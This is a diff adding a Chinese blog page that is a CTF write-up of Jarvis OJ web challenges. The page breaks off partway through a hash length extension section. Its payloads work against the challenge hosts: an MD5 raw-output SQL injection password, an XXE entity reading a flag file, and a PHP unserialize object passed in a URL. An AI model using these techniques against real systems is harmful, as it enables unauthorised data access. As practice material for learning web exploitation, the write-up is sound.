@@ -1,0 +1,1428 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="en">
+    <head>
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.2 -->
+    <script>
+        window.materialVersion = "1.5.2"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            Jarvis OJ Writeup | 
+        
+        Cyris | 绿生
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
+    <link rel="icon" href="/img/favicon.png">
+
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="description" itemprop="description" content="记录一些 Jarvis OJ 上的题。
+平台地址：https://www.jarvisoj.com/">
+    <meta name="keywords" content="null,CTF">
+    <meta name="theme-color" content="#0097A7">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.en.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+            
+                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?VbSuLZyOpxJuf3o2tYEOVg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/tomorrow-night-eighties.min.css?2LJQzURO+Kr8r/fl/T8oMA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+            
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #4d4d4d;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #4d4d4d !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #4d4d4d !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #4d4d4d !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #4d4d4d;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="Cyris | 绿生">
+    <meta name="msapplication-starturl" content="https://blog.cyris.cn/posts/jarvisoj-wp/">
+    <meta name="msapplication-navbutton-color" content="#0097A7">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="Cyris | 绿生">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="/img/favicon.png">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+        
+            <link rel=alternate type="application/atom+xml" href="/atom.xml">
+        
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="https://blog.cyris.cn/posts/jarvisoj-wp/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="Jarvis OJ Writeup | Cyris | 绿生">
+    <meta property="og:image" content="/img/favicon.png">
+    <meta property="og:description" content="记录一些 Jarvis OJ 上的题。
+平台地址：https://www.jarvisoj.com/">
+    <meta property="og:article:tag" content="CTF"> 
+
+    
+        <meta property="article:published_time" content="Sat Nov 04 2017 11:23:21 GMT+0800">
+        <meta property="article:modified_time" content="Sun Apr 01 2018 14:23:49 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="https://blog.cyris.cn/posts/jarvisoj-wp/index.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "https://blog.cyris.cn/posts/jarvisoj-wp/index.html",
+    "headline": "Jarvis OJ Writeup",
+    "datePublished": "Sat Nov 04 2017 11:23:21 GMT+0800",
+    "dateModified": "Sun Apr 01 2018 14:23:49 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "Cyris",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/cyris.png"
+        },
+        "description": "时雨金时，抓住有味。"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "Cyris | 绿生",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.png"
+        }
+    },
+    "keywords": ",CTFnull",
+    "description": "记录一些 Jarvis OJ 上的题。
+平台地址：https://www.jarvisoj.com/",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web"><span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Login"><span class="post-toc-text">Login</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#api调用"><span class="post-toc-text">api调用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#神盾局的秘密"><span class="post-toc-text">神盾局的秘密</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag在管理员手里"><span class="post-toc-text">flag在管理员手里</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHPINFO"><span class="post-toc-text">PHPINFO</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Pwn"><span class="post-toc-text">Pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XMAN-level0"><span class="post-toc-text">[XMAN]level0</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XMAN-level1"><span class="post-toc-text">[XMAN]level1</span></a></li></ol></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 3 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                Jarvis OJ Writeup
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/cyris.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>Cyris</strong>
+        <span>Nov 04, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/CTF/">CTF</a>
+    </ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+
+    <!-- Share Twitter -->
+    
+
+    <!-- Share Facebook -->
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=Cyris | 绿生&title=Jarvis OJ Writeup&summary=我试图在寻找的，也许是一种清晰而诚恳的自我表达。&pics=https://blog.cyris.cn/img/favicon.png&url=https://blog.cyris.cn/posts/jarvisoj-wp/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                Share to QQ
+            </li>
+        </a>
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+    
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>记录一些 Jarvis OJ 上的题。</p>
+<p>平台地址：<a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></p>
+<a id="more"></a> 
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>需要密码才能获得flag哦。     </p>
+<p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p>
+<p>在 Headers 里找到一条hint：  </p>
+<pre><code>Hint:&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;
+</code></pre><p>涉及到一个MD5加密后的注入问题。    </p>
+<p>关于这条md5语句我们先来看下php手册中的描述：</p>
+<blockquote>
+<p><strong>Description</strong></p>
+<p>string md5 ( string str [, bool raw_output] )</p>
+<p>Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16.</p>
+<p>注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE</p>
+</blockquote>
+<p>也就是说，如果md5后的hex转换成字符串后，若包含 <code>&#39;or&#39;&lt;trash&gt;</code> 这样的字符串，那整个sql语句就会变成：   </p>
+<pre><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;&lt;trash&gt;&#39;
+</code></pre><p>就可以进行注入了。   </p>
+<p>网上找到一个字符串：<code>ffifdyop</code></p>
+<p>md5以后：<code>276f722736c95d99e921722cf9ed621c</code></p>
+<p>再转换成字符串即为<code>&#39;or&#39;&lt;trash&gt;</code>  </p>
+<p>把上面这个字符串作为 password 传入即可。  </p>
+<hr>
+<h3 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h3><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
+<p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
+<p>直接能看到源码：</p>
+<pre><code class="Javascript">&lt;script&gt;
+function XHR() {
+        var xhr;
+        try {xhr = new XMLHttpRequest();}
+        catch(e) {
+            var IEXHRVers =[&quot;Msxml3.XMLHTTP&quot;,&quot;Msxml2.XMLHTTP&quot;,&quot;Microsoft.XMLHTTP&quot;];
+            for (var i=0,len=IEXHRVers.length;i&lt; len;i++) {
+                try {xhr = new ActiveXObject(IEXHRVers[i]);}
+                catch(e) {continue;}
+            }
+        }
+        return xhr;
+    }
+
+function send(){
+ evil_input = document.getElementById(&quot;evil-input&quot;).value;
+ var xhr = XHR();
+     xhr.open(&quot;post&quot;,&quot;/api/v1.0/try&quot;,true);
+     xhr.onreadystatechange = function () {
+         if (xhr.readyState==4 &amp;&amp; xhr.status==201) {
+             data = JSON.parse(xhr.responseText);
+             tip_area = document.getElementById(&quot;tip-area&quot;);
+             tip_area.value = data.task.search+data.task.value;
+         }
+     };
+     xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;);
+     xhr.send(&#39;{&quot;search&quot;:&quot;&#39;+evil_input+&#39;&quot;,&quot;value&quot;:&quot;own&quot;}&#39;);
+}
+&lt;/script&gt;
+</code></pre>
+<p>光看这个没找到什么特别的东西，搜了一些资料发现这题是关于 <a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">XXE漏洞</a> ，简单地说就是利用 <code>xml</code> 中的 <code>Entity</code> 实体来读取文件或者执行系统命令等，以造成攻击。  </p>
+<p>这题里先把 <code>Content-Type</code> 改成 <code>application/xml</code>，然后构造：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE xdsec [
+&lt;!ELEMENT methodname ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;/home/ctf/flag.txt&quot; &gt;]&gt;
+&lt;methodcall&gt;
+&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
+&lt;/methodcall&gt;
+</code></pre>
+<p>就可以获取flag了。</p>
+<hr>
+<h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p>
+<p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p>
+<p>扫了一下目录，只发现了 <code>showing.php</code> 和 <code>index.php</code>。</p>
+<p>查看源码发现</p>
+<pre><code class="HTML">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt;
+</code></pre>
+<p>感觉像文件包含，但是现在除了这张图外没有别的能利用的东西，试着读取 <code>showing.php</code> 本身：</p>
+<p><img src="/posts/jarvisoj-wp/1.png" alt=""></p>
+<p>可以看到源码，过滤了 <code>pctf</code> 。但是没什么利用方式，如果直接查看 <code>/pctf.php</code> 拿到的是假flag。同样的方式读取 <code>index.php</code>：</p>
+<pre><code class="PHP">&lt;?php 
+    require_once(&#39;shield.php&#39;);
+    $x = new Shield();
+    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;
+</code></pre>
+<p>然后拿到 <code>shield.php</code> 的源码：</p>
+<pre><code class="PHP">&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &#39;&#39;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) 
+            &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE
+            &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;
+</code></pre>
+<p><code>shield.php</code> 中说flag在 <code>pctf.php</code> 里，但是在 <code>showing.php</code> 中被过滤了，所以直接读它拿到的是假flag。留意到 <code>index.php</code> 里用了反序列化，可以利用这点构造payload：</p>
+<pre><code class="PHP">&lt;?php
+    class Shield {
+        public $file;
+        function __construct($filename = &#39;&#39;) {
+            $this -&gt; file = $filename;
+        }
+    }
+    $a = new Shield();
+    $a-&gt;file = &quot;pctf.php&quot;;
+    echo serialize($a);
+?&gt;
+</code></pre>
+<p>序列化后的结果为：</p>
+<pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}
+</code></pre><p>利用 <code>index.php</code> 中的 <code>class</code> 参数传入payload然后再反序列化就可以拿到flag了。</p>
+<pre><code>http://web.jarvisoj.com:32768/?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}
+</code></pre><pre><code class="HTML">&lt;!--?php 
+    //Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
+    //Fake flag:
+    echo &quot;FLAG: PCTF{I_4m_not_fl4g}&quot;
+?--&gt;
+</code></pre>
+<hr>
+<h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>只有管理员才能获得flag，你能想办法获得吗？</p>
+<p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p>
+<p>vim备份文件泄露（ <code>/index.php~</code> ），恢复后拿到源码（题目有点问题，<code>vim -r</code> 一直失败，想强行手动恢复但是感觉没啥意义…就直接搜了原题的源码贴上来了）</p>
+<pre><code class="PHP">&lt;html&gt;  
+    &lt;head&gt;
+        &lt;title&gt;Web 350&lt;/title&gt;
+        &lt;style type=&quot;text/css&quot;&gt;
+            body {
+                background:gray;
+                text-align:center;  
+            }
+        &lt;/style&gt;
+    &lt;/head&gt; 
+    &lt;body&gt;
+        &lt;?php
+            $auth = false;
+            $role = &quot;guest&quot;;   
+            $salt = ;
+            if (isset($_COOKIE[&quot;role&quot;])) {
+                $role = unserialize($_COOKIE[&quot;role&quot;]);
+                $hsh = $_COOKIE[&quot;hsh&quot;];
+                if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) {    
+                    $auth = true;
+                }
+                else {
+                    $auth = false;
+                } else {}   
+                $s = serialize($role);
+                setcookie(&#39;role&#39;,$s);
+                $hsh = md5($salt.strrev($s));
+                setcookie(&#39;hsh&#39;,$hsh);
+            }
+            if ($auth) {
+                echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;
+            } 
+            else {
+                echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;  
+            }
+        ?&gt;  
+    &lt;/body&gt; 
+&lt;/html&gt;
+</code></pre>
+<p>核心语句为：</p>
+<pre><code>$role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))
+</code></pre><p>查了些资料，发现可以使用 <code>哈希长度扩展攻击</code> 。</p>
+<p>做题的时候整理了一下这里涉及的知识点 - <a href="http://blog.cyris.cn/2018/02/02/hash-extender-attack/">传送门</a></p>
+<p>利用工具：</p>
+<blockquote>
+<p><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">HashPump</a><br><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">hash_extender</a></p>
+</blockquote>
+<p>已有条件：</p>
+<pre><code>Cookie-hsh：3a4727d57463f122833d9e732f94e4e0
+Cookie-role：s%3A5%3A%22guest%22%3B
+需要求：md5(salt+strrev(admin))
+* salt长度未知
